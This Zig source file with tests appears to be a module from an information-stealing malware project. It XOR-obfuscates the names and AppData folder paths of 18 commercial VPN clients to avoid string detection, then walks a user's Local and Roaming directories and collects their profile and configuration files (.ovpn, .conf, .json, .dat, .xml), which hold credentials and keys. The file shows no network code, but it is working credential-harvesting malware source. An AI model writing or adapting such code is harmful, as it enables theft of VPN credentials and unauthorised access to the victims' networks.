const std = @import("std");
const hash = @import("../types/hash.zig");

pub const VpnClient = struct {
    name: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const num_vpns = 18;
    pub const names = [num_vpns][]const u8{
        &hash.xorEncrypt("NordVPN"),
        &hash.xorEncrypt("OpenVPN"),
        &hash.xorEncrypt("WireGuard"),
        &hash.xorEncrypt("SurfShark"),
        &hash.xorEncrypt("ExpressVPN"),
        &hash.xorEncrypt("CyberGhost"),
        &hash.xorEncrypt("PIA"),
        &hash.xorEncrypt("Mullvad"),
        &hash.xorEncrypt("Windscribe"),
        &hash.xorEncrypt("TunnelBear"),
        &hash.xorEncrypt("Hotspot Shield"),
        &hash.xorEncrypt("VyprVPN"),
        &hash.xorEncrypt("Hamachi"),
        &hash.xorEncrypt("HideMyName"),
        &hash.xorEncrypt("IpVanish"),
        &hash.xorEncrypt("RadminVPN"),
        &hash.xorEncrypt("SoftEther"),
        &hash.xorEncrypt("ProtonVPN"),
    };
    pub const paths = [num_vpns][]const u8{
        &hash.xorEncrypt("NordVPN"),
        &hash.xorEncrypt("OpenVPN Connect\\profiles"),
        &hash.xorEncrypt("WireGuard\\Configurations"),
        &hash.xorEncrypt("Surfshark"),
        &hash.xorEncrypt("ExpressVPN"),
        &hash.xorEncrypt("CyberGhost"),
        &hash.xorEncrypt("Private Internet Access"),
        &hash.xorEncrypt("Mullvad VPN"),
        &hash.xorEncrypt("Windscribe"),
        &hash.xorEncrypt("TunnelBear"),
        &hash.xorEncrypt("Hotspot Shield"),
        &hash.xorEncrypt("VyprVPN"),
        &hash.xorEncrypt("Hamachi"),
        &hash.xorEncrypt("Hide My Name"),
        &hash.xorEncrypt("IPVanish"),
        &hash.xorEncrypt("Radmin VPN"),
        &hash.xorEncrypt("SoftEther VPN Client"),
        &hash.xorEncrypt("ProtonVPN"),
    };
    pub const use_local = [num_vpns]bool{
        false, // NordVPN
        false, // OpenVPN
        false, // WireGuard
        true, // SurfShark
        false, // ExpressVPN
        false, // CyberGhost
        false, // PIA
        false, // Mullvad
        false, // Windscribe
        true, // TunnelBear
        true, // Hotspot Shield
        false, // VyprVPN
        false, // Hamachi
        false, // HideMyName
        false, // IpVanish
        false, // RadminVPN
        false, // SoftEther
        true, // ProtonVPN
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listAllFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn listFilesByExt(allocator: std.mem.Allocator, dir_path: []const u8, ext: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ext)) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn collectVpnFiles(allocator: std.mem.Allocator, index: usize, full_path: []const u8) ![][]const u8 {
    switch (index) {
        0, 3, 4, 5, 9, 17 => return listAllFiles(allocator, full_path),
        1 => return listFilesByExt(allocator, full_path, ".ovpn"),
        2 => return listFilesByExt(allocator, full_path, ".conf"),
        6, 7 => return listFilesByExt(allocator, full_path, ".json"),
        8, 10 => return listFilesByExt(allocator, full_path, ".cfg"),
        11, 14 => return listFilesByExt(allocator, full_path, ".dat"),
        12 => return listFilesByExt(allocator, full_path, ".conf"),
        13, 15 => return listFilesByExt(allocator, full_path, ".xml"),
        16 => return listFilesByExt(allocator, full_path, ".config"),
        else => return allocator.alloc([]const u8, 0),
    }
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]VpnClient {
    var entries = std.ArrayList(VpnClient).init(allocator);
    errdefer {
        for (entries.items) |e| {
            allocator.free(e.name);
            for (e.files) |f| allocator.free(f);
            allocator.free(e.files);
        }
        entries.deinit();
    }

    inline for (0..E.num_vpns) |i| {
        const base = if (E.use_local[i]) local else roaming;

        const pe = E.paths[i];
        var path_buf: [pe.len]u8 = undefined;
        hash.xorDecrypt(pe, &path_buf);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ base, &path_buf }) catch continue;

        if (!dirExists(full_path)) {
            allocator.free(full_path);
            continue;
        }

        const files = collectVpnFiles(allocator, i, full_path) catch |err| {
            allocator.free(full_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        allocator.free(full_path);

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);
        const name = allocator.dupe(u8, &name_buf) catch {
            for (files) |f| allocator.free(f);
            allocator.free(files);
            return error.OutOfMemory;
        };

        try entries.append(VpnClient{ .name = name, .files = files });
    }

    return try entries.toOwnedSlice();
}

test "all 18 VPN names decrypt correctly" {
    inline for (0..E.num_vpns) |i| {
        var buf: [E.names[i].len]u8 = undefined;
        hash.xorDecrypt(E.names[i], &buf);
        try std.testing.expect(buf.len > 0);
    }
}

test "first VPN is NordVPN" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualStrings("NordVPN", &buf);
}

test "last VPN is ProtonVPN" {
    var buf: [E.names[17].len]u8 = undefined;
    hash.xorDecrypt(E.names[17], &buf);
    try std.testing.expectEqualStrings("ProtonVPN", &buf);
}

test "collect returns empty for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer {
        for (result) |e| {
            std.testing.allocator.free(e.name);
            for (e.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(e.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "VPN count is 18" {
    try std.testing.expect(E.names.len == 18);
}
